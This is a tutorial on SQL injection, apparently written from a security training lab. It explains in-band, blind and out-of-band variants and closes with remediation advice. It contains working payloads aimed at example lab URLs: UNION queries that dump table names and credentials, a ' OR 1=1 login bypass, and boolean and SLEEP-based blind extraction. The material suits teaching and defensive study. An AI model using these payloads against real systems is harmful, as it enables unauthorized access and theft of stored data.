# SQL Injection
SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.

When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.

## What is SQLi?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:

```
https://website.thm/blog?id=1
```

From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

```sql
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

In this instance, the id parameter from the query string is used directly in the SQL query.

Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:

```
https://website.thm/blog?id=2;--
```

Which would then, in turn, produce the SQL statement:
```sql
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the first part of the SQL query, which will return the article with an id of 2 whether it is set to public or not.

This was just one example of an SQL Injection vulnerability of a type called `In-Band SQL Injection`; there are 3 types in total `In-Band`, `Blind` and `Out Of Band`.

## In-Band SQL Injection
### In-Band SQL
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

### In-Band SQL Injection - Error Based
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


### In-Band SQL Injection - Union Based
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

### Practical
The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

Examples of error-based SQL Injection:

```bash
# Website
https://website.com/article?id=1

# Test for error with single quote
https://website.com/article?id=1'
'
# Exploit
https://website.com/article?id=1 UNION SELECT 1,2,3

# Get database name
https://website.com/article?id=0 UNION SELECT 1,2,database()

# Get table names
https://website.com/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

# Get a specific table's column names
https://website.com/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

# Get a specific table's column data
https://website.com/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

## Blind SQL Injection - Authentication Bypass
### Blind SQLi
Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.

### Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. 

In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

### Practical
Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:

```sql	
select * from users where username='%username%' and password='%password%' LIMIT 1;
```
N.B The %username% and %password% values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.

To make this into a query that always returns as true, we can enter the following into the password field:  
```sql
' OR 1=1;--
```

Which turns the SQL query into the following:

```sql
select * from users where username='' and password='' OR 1=1;
```

Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.

## Blind SQL Injection - Boolean Based
### Boolean Based
Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.

### Practical
Example mock browser:

```bash
https://website.thm/checkuser?username=admin
```

When entered, the browser body contains the contents of {"taken":true}. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. 

In fact, we can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.

The SQL query that is processed looks like the following:

```sql
select * from users where username = '%username%' LIMIT 1;
```

As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.

```sql
admin123' UNION SELECT 1;--
```
If this won't work, we can try adding more colmns to the query.

```sql
admin123' UNION SELECT 1,2;--
```
If this doesn't work, we can try adding even more columns to the query.


```sql
admin123' UNION SELECT 1,2,3;--
```

This returns the following response:

```json
{"taken":true}
```

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.

Lets start by trying to find a database that starts with the letter a.

```sql	
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
```
```json
{"taken":false}
```
This sadly returns false. Lets try the letter b.

```sql	
admin123' UNION SELECT 1,2,3 where database() like 'b%';--
```
```json
{"taken":false}
```
False again. After trying multiple letters, one of them might return true. In this case if it was s, the query would look like the following:

```sql	
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
```json
{"taken":true}
```
Okay, so we got the first letter of the database name. Now we can try to find the second letter by following the same method.

We could say that the database name was `sqli_three`.

To find the tables, we have to use the same process as before..
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

And try different letters until we find a table that returns true.

We can say the table name was `users`.

Alright now we have the table name, we can try to find the columns by doing what? :). Exactly, the same process as before.

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

We can imagine we got the columns `id`, `username` and `password` from doing that.

We have to find a user we can check the password for. We can again do this by manually trying different usernames until we find one that returns true.

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

We can say the username was `admin`.

Now we can try to find the password for the user we found.

```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '1%
```

We can say the password was `3845`.

All in all, this process took a lot of time and effort. Luckily, there are tools that can automate this process for us. One of the most popular tools for this is `sqlmap`.

## Blind SQL Injection - Time Based
### Time-Based
A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 


So, for example, when trying to establish the number of columns in a table, you would use the following query:

```sql	
admin123' UNION SELECT SLEEP(5);--
```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```sql	
admin123' UNION SELECT SLEEP(5),2;--
```

This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.

You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.

## Out Of Band SQL Injection
Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2) The Website makes an SQL query to the database which also passes the hacker's payload.
3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

# Remediation
## Remediation
As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:

## Prepared Statements (With Parameterized Queries):
In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.

## Input Validation:
Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 

##  Escaping User Input:
Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.